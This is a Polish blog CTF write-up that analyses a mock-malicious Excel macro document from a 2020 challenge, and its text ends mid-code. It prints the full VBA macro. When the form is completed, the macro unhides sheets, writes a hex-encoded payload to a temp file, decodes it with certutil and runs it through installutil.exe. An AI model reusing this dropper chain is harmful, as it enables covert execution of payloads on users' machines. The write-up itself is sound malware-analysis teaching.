<!doctype html><html lang=pl><head><title>Analiza zmyślonego malware :: FoxtrotLabs — Tam gdzie bajty mówią dobranoc</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Czwarte z rzędu Ostatnio upominałem się o trochę trudniejsze zadania CTFowe organizowane przez ten portal. Mam wrażenie, że moje uwagi zostały wysłuchane :) bo dziś na warsztat trafił trochę trudniejszy czelendż, od tych poprzednich. Okazuje się, że pomimo urlopu i trafienia na zadanie 3 dni po publikacji, znów udało mi się je rozwiązać w TOP1. Poniżej przedstawiam writeup opisujący jak doszedłem do rozwiązania. Tym razem jest to wyzwanie ponownie przygotowane przez Grzegorza Sowę, z którym miałem okazję porozmawiać po zgłoszeniu rozwiązania."><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/pl/2020/08/analiza-zmy%C5%9Blonego-malware/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=assets/%25!s%28%3cnil%3e%29.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href><meta name=twitter:card content="summary"><meta name=twitter:creator content="foxtrot_0xf4ult"><meta property="og:locale" content="pl"><meta property="og:type" content="article"><meta property="og:title" content="Analiza zmyślonego malware :: FoxtrotLabs"><meta property="og:description" content="Writeup z rozwiązania rozstrzygniętego konkursu na WladcySieci"><meta property="og:url" content="https://foxtrotlabs.cc/pl/2020/08/analiza-zmy%C5%9Blonego-malware/"><meta property="og:site_name" content="Analiza zmyślonego malware"><meta property="og:image" content="https://wladcysieci.pl/wp-content/uploads/2020/07/mail.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-08-20 17:46:35 +0200 +0200"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/pl><div class=logo>foxtrotlabs-pl</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/pl/2020/08/analiza-zmy%C5%9Blonego-malware/>Analiza zmyślonego malware</a></h1><div class=post-meta><span class=post-date>2020-08-20</span></div><span class=post-tags>#<a href=https://foxtrotlabs.cc/pl/tags/reverseengineering/>reverseengineering</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/malware/>malware</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/hacking/>hacking</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/ctf/>ctf</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/easychalls/>easychalls</a>&nbsp;
#<a href=https://foxtrotlabs.cc/pl/tags/re/>re</a>&nbsp;
</span><img src=https://wladcysieci.pl/wp-content/uploads/2020/07/mail.png class=post-cover alt="Analiza zmyślonego malware"><div class=post-content><div><h2 id=czwarte-z-rzędu>Czwarte z rzędu<a href=#czwarte-z-rzędu class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Ostatnio upominałem się o trochę trudniejsze zadania CTFowe organizowane przez <a href=https://wladcysieci.pl/2020/07/17/wakacyjny-konkurs-capture-the-flag/>ten</a> portal. Mam wrażenie, że moje uwagi zostały wysłuchane :) bo dziś na warsztat trafił trochę trudniejszy <code>czelendż</code>, od tych poprzednich. Okazuje się, że pomimo urlopu i trafienia na zadanie 3 dni po publikacji, znów udało mi się je rozwiązać w <em>TOP1</em>. Poniżej przedstawiam writeup opisujący jak doszedłem do rozwiązania. Tym razem jest to wyzwanie ponownie przygotowane przez Grzegorza Sowę, z którym miałem okazję porozmawiać po zgłoszeniu rozwiązania. Podobno można prościej, ale wymaga to znajomości jakiś narzędzi napisanych w C#. Nie znam się, więc z ewentualnymi pytaniami myślę, że warto łapać Autora. Od dzisiaj daję sobie spokój z wyzwaniami WładcówSieci. Cztery razy na podium starczy. Dam szansę innym. Do zadań wrócę jeśli będą ciekawe i wymagające. Jednocześnie obiecuję nie rozwiązywać ich za szybko ;)</p><blockquote><p>Side note: Nie wszystkie <em>ciekawe</em> mechanizmy wyłapałem, ale cel był taki aby zadanie rozwiązać jak najszybciej a nie zastanawiać się nad użytymi technikami. Zachęcam do samodzielnego rozwiązania i analizy.</p></blockquote><p>Przy okazji, uruchomiłem statyczne komentarze na blogu, od teraz można komentować moje wpisy! :). Jak na statycznego bloga przystało, wykorzystuje <a href=https://staticman.net/>staticmana</a> odpalonego na darmowej instancji <a href=https://heroku.com/>heroku</a>. Pula tysiąca komentarzy miesięcznie czeka na wykorzystanie!</p><h2 id=recon>Recon<a href=#recon class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Treść zadania wyglądała następująco:</p><p><img src=https://wladcysieci.pl/wp-content/uploads/2020/07/mail.png alt=img></p><p>dodatkowo Autorzy zadania uściślili wymagania w sposób pokazany poniżej:</p><pre tabindex=0><code>Cel wyzwania:

Celem zadania jest odnalezienie przepisu na groszek oraz opisanie kolejno wykonywanych kroków.

Pod poniższym linkiem: https://cutt.ly/YiVBAZ2 znajduje się załącznik maila, którego dostał główny informatyk.

Hasło do zipa to: wladcysieci.

Prosimy o przesłanie opisu wykonanych kroków oraz podanie przepisu w postaci flagi -&gt; FLG{xxxx} oraz opisu wykonanych czynnośna adres: info@wladcysieci.pl

Do wygrania nagroda główna Plecak Dell Pursuit 15 przydatny podczas wakacyjnych podróży. Na kolejne dwie osoby, które rozwiążą zadanie czekają bezprzewodowe słuchawki JBL Tune.

Dodatkowo na każdego, kto weźmie udział w gRywalizacji czeka +5pkt w rankingu oraz paczka upominków od Władcy Sieci.

Życzymy powodzenia!
</code></pre><p>Okazuje się, że początkowo forma flagi została przedstawiona w sposób nieprawidłowy oraz przedstawione wymagania nie były spójne (po wysłaniu zapytania o format flagi, wyszło że wysłanie krok po kroku rozwiązania jest również wymagane). Po zwrócieniu uwagi na powyższe niedopatrzenia post został edytowany i usterki naprawione.</p><p>Link do zadania prowadzi do archiwum zip na Google Drive, w którym znajdują się dwa pliki:</p><ul><li>dofinansowanie.xmls</li><li>przepis</li></ul><p>Po wypakowaniu (archiwum zabezpieczone jest hasłem wladcysieci) zipa można przyjrzeć się zawartości. Otrzymujemy dwa pliki, <code>przepis</code> stanowi dane binarne (zapewne zaszyfrowane w skutek działania malware podrzuconego szefowi firmy), tymczasem drugi plik (<code>dofinansowanie.xlsm</code>) stanowi dokument Excela (zapewne ze złosliwymi makrami).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcyscieci ❯ ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>1412</span>
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> fox users    <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>20</span> 16:35 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>11</span> fox users   <span style=color:#ae81ff>20480</span> Aug <span style=color:#ae81ff>20</span> 16:35 ..
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> fox users  <span style=color:#ae81ff>226325</span> Jun <span style=color:#ae81ff>30</span> 05:46 dofinansowanie.xlsm
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> fox users <span style=color:#ae81ff>1190762</span> Jun <span style=color:#ae81ff>30</span> 05:46 przepis
</span></span><span style=display:flex><span>~/Downloads/wladcyscieci ❯  r2 -qfnc <span style=color:#e6db74>&#39;p==&#39;</span> przepis
</span></span><span style=display:flex><span>                                                                              
</span></span><span style=display:flex><span>                █            █ █                               █            █ 
</span></span><span style=display:flex><span> █      █     █ █            █ █     ██          █ █          ███        █  █ 
</span></span><span style=display:flex><span> █      █     █ █   █  ██ █  █ █   █ ██        █ █ █          ███        █  █ 
</span></span><span style=display:flex><span> █      ██    █ █   █ ███ █  █ █   ████        █ █ █   █  █   ███   █ █  █ ██ 
</span></span><span style=display:flex><span> █  █   ██    █ █   █ ███ █  █ ██  █████       █ █ █   █  █   ███   █ █  █ ██ 
</span></span><span style=display:flex><span>██  █   ██    █ █ █ █ ███ █  █ ██  █████       █ █ █   █  ██  ████  ███  █ ██ 
</span></span><span style=display:flex><span>██  █   ███   █ █ █ █ ███ ██ █ ██  █████       █ █ █   █  ██  ████  ███  █ ██ 
</span></span><span style=display:flex><span>███ ███ ███   █ █ █ █ ███ ██ █ ██ ██████   █   █ █ █   ██ ██  ████  ███  █ ██ 
</span></span><span style=display:flex><span>███ ███ ███ █ █████ ██████████ ██ ██████ █ ███ ███ █   ██ ██  █████ ███ ██ ██ 
</span></span><span style=display:flex><span>███ ███████ ██████████████████ ██ ██████ █████████ █ █ ██ ██  █████ ██████ ██ 
</span></span><span style=display:flex><span>███ ███████ ██████████████████ ██ ██████ █████████ █ █ ██ ██  █████ ██████ ██ 
</span></span><span style=display:flex><span>███████████ █████████████████████ ██████ ███████████ ████ █████████ ██████ ██ 
</span></span><span style=display:flex><span>██████████████████████████████████████████████████████████████████████████████
</span></span><span style=display:flex><span>~/Downloads/wladcyscieci ❯ rahash2 -a entropy przepis 
</span></span><span style=display:flex><span>przepis: 0x00000000-0x00122b69 entropy: 7.98529263
</span></span><span style=display:flex><span>~/Downloads/wladcyscieci ❯ file przepis 
</span></span><span style=display:flex><span>przepis: data
</span></span><span style=display:flex><span>~/Downloads/wladcyscieci ❯ file dofinansowanie.xlsm 
</span></span><span style=display:flex><span>dofinansowanie.xlsm: Microsoft Excel 2007+
</span></span></code></pre></div><h2 id=plik-office>Plik Office<a href=#plik-office class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Nie pamiętam dokładnego powodu, a nie chcę zasłaniać się lenistwem, przez który nie analizowałem dokumentu Office przy pomocy Excela lub LibreOffice. Jak się okazało brak GUI był kluczem do sukcesu i pozwolił obejść rzekome trudności. Funkcjonalność Excela pozwala na ukrycie arkuszy, co miało na celu utrudnienie analizy pliku.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcyscieci ❯ ssconvert -S dofinansowanie.xlsm asdf.csv
</span></span><span style=display:flex><span>~/Downloads/wladcyscieci ❯ ls -la | grep asdf
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> rav users     <span style=color:#ae81ff>441</span> Aug <span style=color:#ae81ff>20</span> 16:41 asdf.csv.0
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> rav users     <span style=color:#ae81ff>195</span> Aug <span style=color:#ae81ff>20</span> 16:41 asdf.csv.1
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> rav users  <span style=color:#ae81ff>128261</span> Aug <span style=color:#ae81ff>20</span> 16:41 asdf.csv.2
</span></span></code></pre></div><p>Program <a href=https://linux.die.net/man/1/ssconvert>ssconvert</a> umożliwia konwersję arkuszy kalkulacyjnych na wiele formatów. W tym czytelny z poziomu konsoli format tekstowy. Wynikiem konwersji danego <code>xlsm</code> na <code>csv</code> są trzy pliki odpowiadające trzem arkuszom znajdującym się wewnątrz. Jeśli użytkownik dokonałby analizy przy pomocy pakietu Office zapewne nie zobaczyłby dwóch ukrytych arkuszy. Ale po kolei.</p><p>Plik <code>asdf.csv.0</code> stanowi główny arkusz dokumentu wyglądający następująco:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcyscieci ❯ cat asdf.csv.0 
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Formularz dofinansowania w programie &#34;&#34;Innowacyjna gospodarka&#34;&#34;&#34;</span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Czy produkt firmy wprowadza istotne innowacje na rynek krajowy?&#34;</span>,-
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Czy wykorzystywany park maszynowy został przygotowany pod kątem rozbudowy?&#34;</span>,-
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Czy produkt kojarzony jest przez konsumetów z &#34;&#34;ekologią&#34;&#34;?&#34;</span>,-
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Czy firma dba o rozwój swoich pracowników?&#34;</span>,-
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;Czy zarząd firmy aktywnie wspiera lokalne społeczności?&#34;</span>,-
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>,
</span></span><span style=display:flex><span>-,
</span></span><span style=display:flex><span>tak,
</span></span><span style=display:flex><span>nie,
</span></span></code></pre></div><p>Jest to formularz zawierający serię pytań, na które użytkownik powinien udzielić odpowiedzi aby otrzymać dofinansowanie. Z kolei następny arkusz zawiera serię dziwnych ciągów oraz nazw programów systemu Windows.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcyscieci ❯ cat asdf.csv.1
</span></span><span style=display:flex><span><span style=color:#ae81ff>34</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>30</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>48</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>
</span></span><span style=display:flex><span>open
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;decodehex -f&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>
</span></span><span style=display:flex><span>scripting.filesystemobject
</span></span><span style=display:flex><span><span style=color:#ae81ff>43</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>new:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>0883f19c0a00-5548-1d11-1a2f-09dfa80c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:<span style=color:#ae81ff>\w</span>indows<span style=color:#ae81ff>\m</span>icrosoft.net<span style=color:#ae81ff>\F</span>ramework<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>installutil.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>certutil.exe
</span></span></code></pre></div><p>Trzeci z wypakowanych arkuszy jest najbardziej tajemniczy i stanowi kolumnę liczb. Jego fragment przedstawiam poniżej:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcyscieci ❯ cat asdf.csv.2 | wc -l 
</span></span><span style=display:flex><span><span style=color:#ae81ff>22016</span>
</span></span><span style=display:flex><span>~/Downloads/wladcyscieci ❯ head asdf.csv.2        
</span></span><span style=display:flex><span><span style=color:#ae81ff>45901</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>34906</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>37776</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>18688</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>19459</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>50432</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>768</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>49408</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>52996</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>46080</span>
</span></span></code></pre></div><p>Na tym etapie już staje się jasne co się dzieje. Użytkownik uruchamia dokument i uzupełnia pola. W międzyczasie (albo w wyniku uzupełnienia formularza) wywoływane są makra, ktore korzystając z dwóch nastepnych arkuszy dokonują jakiegoś działania. Pozostaje sprawdzić jakie makra obecne są w arkuszu. W tym celu można wykorzystać pythonowe narzędzie <code>officeparser</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads/wladcyscieci ❯ officeparser --extract-macros ./dofinansowanie.xlsm
</span></span><span style=display:flex><span>WARNING: last sector has invalid size
</span></span><span style=display:flex><span>INFO: Saving VBA code to ./Ten_skoroszyt_1.cls
</span></span><span style=display:flex><span>INFO: Saving VBA code to ./Arkusz1_1.cls
</span></span><span style=display:flex><span>INFO: Saving VBA code to ./Arkusz2_1.cls
</span></span><span style=display:flex><span>INFO: Saving VBA code to ./Arkusz3_1.cls
</span></span></code></pre></div><p>Okazuje się, że do przygotowania zadania (czego dowiedziałem się już po zgłoszeniu) został wykorzystany program <a href=https://github.com/outflanknl/EvilClippy>EvilClippy</a>, którego funkcjonalność pozwala między innymi na ukrycie makr przed użytkownikiem. Jak widać tym razem udało się je wypakować bez większych problemów. Tym samym otrzymałem makra dostepne w dokumencie (jak się później okazało - poprawnie wyodrębnione z dokumentu).</p><p>Z czterech plików, aż trzy zawierały boilerplate code, który nie wnosił nic do analizy i wyglądał nastepująco:</p><pre tabindex=0><code class=language-vbscript data-lang=vbscript>Attribute VB_Name = &#34;Arkusz3&#34;
Attribute VB_Base = &#34;0{00020820-0000-0000-C000-000000000046}&#34;
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
</code></pre><p>Natomiast plik <code>Arkusz_1.cls</code> zawierał następujący kod:</p><pre tabindex=0><code class=language-vbscript data-lang=vbscript>~/Downloads/wladcyscieci ❯ cat Arkusz1.cls 
Attribute VB_Name = &#34;Arkusz1&#34;
Attribute VB_Base = &#34;0{00020820-0000-0000-C000-000000000046}&#34;
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Sub fun1(path As String, par As String)
Dim targetFile As String
Dim obj As Object
Dim parvar As Variant

targetFile = Split(path, &#34;&#34;)(0)
Set obj = konwert()
parvar = par
Visible = 1
obj.ShellExecute targetFile, parvar, &#34;&#34;, getGizmo(2), Visible
End Sub

Function getGizmo(loc As Integer)
ind = Worksheets(&#34;Arkusz2&#34;).Range(&#34;A&#34; + CStr(loc)).value
getGizmo = Worksheets(&#34;Arkusz2&#34;).Range(&#34;A&#34; + CStr(ind - 15)).value
End Function


Function konwert()
Set konwert = GetObject(getGizmo(3) + StrReverse(getGizmo(1))).Document.Application

End Function


Sub saveHexFile(fso As Object, fileName As String, worksh As Object, startrow As Long)
  
  Dim value As Long
  Dim outValue As Long
  Dim row, col As Long
  Dim bufpos As Long
  Dim Digit As Integer
  Dim buffer As String
  
  Set mucha = fso.createtextfile(fileName)
  
  hexDigits = &#34;0123456789abcdef&#34;
  row = startrow
  col = 1
  bufpos = 0
  
  Do Until False
    If IsEmpty(worksh.Cells(row, col)) Then
      Exit Do
    End If
    
    value = worksh.Cells(row, col)
    outValue = value Mod 256
    
    Rem convert to hex
    outValueHigh = outValue \ 16
    Digit1 = Mid(hexDigits, outValueHigh + 1, 1)
    
    buffer = buffer + Digit1
    
    outValueLow = outValue Mod 16
    Digit2 = Mid(hexDigits, outValueLow + 1, 1)
    buffer = buffer + Digit2
      
    row = row + 1
    If (row &gt; 65536) Then
      col = col + 1
      row = startrow
    End If
    
    bufpos = bufpos + 2
    If (bufpos &gt; 100) Then
      mucha.writeLine (buffer)
      bufpos = 0
      buffer = &#34;&#34;
    End If
    
  Loop
  mucha.writeLine (buffer)
  mucha.Close
End Sub


Function findframeworkdir(fso As Object, basedir As String)
 basedirlen = Len(basedir)
 
 For Each objFolder In fso.GetFolder(basedir).SubFolders
                 res = InStr(basedirlen + 1, objFolder, &#34;v4.&#34;)
        If res = basedirlen + 1 Then
          findframeworkdir = objFolder
          Exit Function
          
        End If           
    Next
End Function


Sub test()
Dim p As String


Dim tmpname As String

 Dim fso As Object
 Dim kaczka As String
 Dim insutilfullname As String
 Sheets(&#34;Arkusz2&#34;).Visible = True
 Sheets(&#34;Dane&#34;).Visible = True
 Set fso = CreateObject(getGizmo(9))
 kaczka = fso.GetSpecialFolder(2)
  
  
frameworkdir = findframeworkdir(fso, getGizmo(5))
insutilfullname = frameworkdir + &#34;\&#34; + getGizmo(11)


tmpname = kaczka + &#34;\&#34; + fso.getTempName()
tmpname2 = kaczka + &#34;\&#34; + fso.getTempName()

Call saveHexFile(fso, tmpname, Worksheets(&#34;dane&#34;), 100)
fun1 getGizmo(4), &#34;-&#34; + getGizmo(6) + &#34; &#34; + tmpname + &#34; &#34; + tmpname2
fun1 insutilfullname, &#34;&#34; + tmpname2
 Sheets(&#34;Arkusz1&#34;).Visible = True
 
 Sheets(&#34;Arkusz2&#34;).Visible = False
 Sheets(&#34;Dane&#34;).Visible = False
 
End Sub

Sub Worksheet_Change(ByVal Target As Range)
    Dim KeyCells As Range

    answered = 0
    Start = 4
    Number = 5
    
    For i = Start To Start + Number - 1
    If Range(&#34;B&#34; + CStr(i)).value &lt;&gt; &#34;-&#34; Then
    answered = answered + 1
    End If
    Next
    
    If answered = Number Then
    Call verify
    End If 
End Sub

Sub verify()
  Call test
  End Sub
</code></pre><p>Nie wiem czy nazwy poszczególnych zmiennych i funkcji to jakieś nawiązania, ale zdecydowanie nie wyglądają na standardowy kod i warto się im przyjrzeć. Czytanie VBscriptu nie jest dla mnie procesem przyjemnym, dlatego w tak prostych zadaniach uprzyjemniam sobie proces przez wykorzystanie konwertera do bardziej zjadliwego języka jakim jest Python. Skorzystałem z gotowego rozwiązania dostępnego <a href=http://vb2py.sourceforge.net/online_conversion.html>tu</a> (jest też biblioteka). Oczywiście konwersja jednego języka na drugi może nieść za sobą pewne utrudnienia i wyjściowy kod nie zawsze będzie działał, ale w tym przypadku nie potrzebowałem działającego przykładu tylko opisu tego, co się w programie dzieje. Teoretycznie <code>vb2py</code> można by nazwać transpilatorem, bowiem wyjściowy kod funkcjonalnie jest tożsamy z wejściowym, a obydwa języki to ten sam poziom abstrakcji. Praktycznie - nie uruchamiałem tego kodu, ani nie analizowałem biblioteki, więc ciężko mi powiedzieć, czy konwersja wpłynęła jakoś na funkcjonalność kodu.</p><p>Kod w języku Python wygląda dużo zwięźlej i czytelniej</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> vb2py.vbfunctions <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> vb2py.vbdebug <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>fun1</span>(path, par):
</span></span><span style=display:flex><span>    targetFile <span style=color:#f92672>=</span> String()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    obj <span style=color:#f92672>=</span> Object()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    parvar <span style=color:#f92672>=</span> Variant()
</span></span><span style=display:flex><span>    targetFile <span style=color:#f92672>=</span> Split(path, <span style=color:#e6db74>&#39;&#39;</span>)(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    obj <span style=color:#f92672>=</span> konwert()
</span></span><span style=display:flex><span>    parvar <span style=color:#f92672>=</span> par
</span></span><span style=display:flex><span>    Visible <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    obj<span style=color:#f92672>.</span>ShellExecute(targetFile, parvar, <span style=color:#e6db74>&#39;&#39;</span>, getGizmo(<span style=color:#ae81ff>2</span>), Visible)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getGizmo</span>(loc):
</span></span><span style=display:flex><span>    ind <span style=color:#f92672>=</span> Worksheets(<span style=color:#e6db74>&#39;Arkusz2&#39;</span>)<span style=color:#f92672>.</span>Range(<span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> CStr(loc))<span style=color:#f92672>.</span>value
</span></span><span style=display:flex><span>    fn_return_value <span style=color:#f92672>=</span> Worksheets(<span style=color:#e6db74>&#39;Arkusz2&#39;</span>)<span style=color:#f92672>.</span>Range(<span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> CStr(ind <span style=color:#f92672>-</span> <span style=color:#ae81ff>15</span>))<span style=color:#f92672>.</span>value
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> fn_return_value
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>konwert</span>():
</span></span><span style=display:flex><span>    fn_return_value <span style=color:#f92672>=</span> GetObject(getGizmo(<span style=color:#ae81ff>3</span>) <span style=color:#f92672>+</span> StrReverse(getGizmo(<span style=color:#ae81ff>1</span>)))<span style=color:#f92672>.</span>Document<span style=color:#f92672>.</span>Application
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> fn_return_value
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>saveHexFile</span>(fso, fileName, worksh, startrow):
</span></span><span style=display:flex><span>    value <span style=color:#f92672>=</span> Long()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    outValue <span style=color:#f92672>=</span> Long()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    row <span style=color:#f92672>=</span> Variant()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    col <span style=color:#f92672>=</span> Long()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    bufpos <span style=color:#f92672>=</span> Long()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Digit <span style=color:#f92672>=</span> Integer()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    buffer <span style=color:#f92672>=</span> String()
</span></span><span style=display:flex><span>    mucha <span style=color:#f92672>=</span> fso<span style=color:#f92672>.</span>createtextfile(fileName)
</span></span><span style=display:flex><span>    hexDigits <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0123456789abcdef&#39;</span>
</span></span><span style=display:flex><span>    row <span style=color:#f92672>=</span> startrow
</span></span><span style=display:flex><span>    col <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    bufpos <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> (<span style=color:#66d9ef>False</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> IsEmpty(worksh<span style=color:#f92672>.</span>Cells(row, col)):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
